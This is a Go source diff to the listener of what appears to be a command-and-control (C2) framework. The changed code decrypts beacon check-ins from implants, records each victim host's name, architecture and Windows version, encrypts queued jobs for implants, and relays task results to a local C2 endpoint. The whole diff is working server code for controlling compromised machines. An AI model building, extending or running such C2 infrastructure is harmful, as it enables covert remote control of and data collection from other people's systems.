@@ -9,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"reflect"
+	"strings"
 )
 
 func GET_handler(cookie string, listener *Listener, r *http.Request) ([]byte, bool) {
@@ -71,33 +72,21 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch == "" {
+
 			bigInt := new(big.Int)
 			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
 			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+			json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
 
-			eAES.printKey()
-			println("encrypted data = ")
-			printkey(body)
-			json_byte, succ := eAES.DecryptData(GetBytes(body, len(body)))
-			if !succ {
-				println("AES Decrypt fail")
-			}
-
-			var beacon_tmp Beacon
-
-			println("decrypt = ")
-			printkey(json_byte)
 			println(string(json_byte))
 
-			err := json.Unmarshal(json_byte, &beacon_tmp)
+			jsonData, _ := parseJSON(string(json_byte))
 
-			if err != nil {
-				fmt.Println("Error:", err)
-			}
+			mtdt := jsonData["mtdt"]
 
-			listener.Beacons[i].Hostname = beacon_tmp.Hostname
-			listener.Beacons[i].Arch = beacon_tmp.Arch
-			listener.Beacons[i].System = beacon_tmp.System
+			listener.Beacons[i].Hostname = mtdt["h_name"]
+			listener.Beacons[i].Arch = mtdt["arch"]
+			listener.Beacons[i].System = mtdt["wver"]
 
 			println("saving xml")
 			ModifyBeacons("./Listener/"+listener.Lisname, listener.Beacons)
@@ -105,17 +94,24 @@ func POST_handler(body []byte, listener *Listener, r *http.Request, w http.Respo
 			return res, true
 
 		} else if beacon.Ip == ip && beacon.AESkey != "" && beacon.Arch != "" {
-			eAES := getAES(stringToBytes(beacon.AESkey))
-			json_byte, _ := eAES.DecryptData(ReverseBytes(GetBytes(body, len(body))))
-			if json_byte == nil {
+
+			bigInt := new(big.Int)
+			bigInt, _ = bigInt.SetString(beacon.AESkey, 10)
+			eAES := getAES(ReverseBytes(bigInt.Bytes()))
+
+			if len(body) == 0 {
 				if is_jobs_null(listener, i) {
 					return res, true // sleep
 				} else {
 					res = append(res, make_fucker(listener, i)...)
 					res = eAES.EncryptData(res)
+					
+					printkey(res)
+
 					return ReverseBytes(res), true
 				}
 			} else {
+				json_byte, _ := eAES.DecryptData(GetBytes(body, len(body)))
 				remove_job(listener, i)
 				json_byte = append(json_byte, 0x00, IntToUint8(i))
 				Send_Bytes_to(w, json_byte, "http://localhost:50049/c2", expectedHeaders)
@@ -195,4 +191,22 @@ func IntToUint8(num int) uint8 {
 	}
 
 	return uint8(num)
+}
+
+func parseJSON(data string) (map[string]map[string]string, error) {
+	// 清理 JSON 数据，去除不可见字符
+	cleanData := strings.Map(func(r rune) rune {
+		if r >= 32 || r == '\n' || r == '\r' || r == '\t' {
+			return r
+		}
+		return -1
+	}, data)
+
+	var jsonData map[string]map[string]string
+	err := json.Unmarshal([]byte(cleanData), &jsonData)
+	if err != nil {
+		return nil, err
+	}
+
+	return jsonData, nil
 }
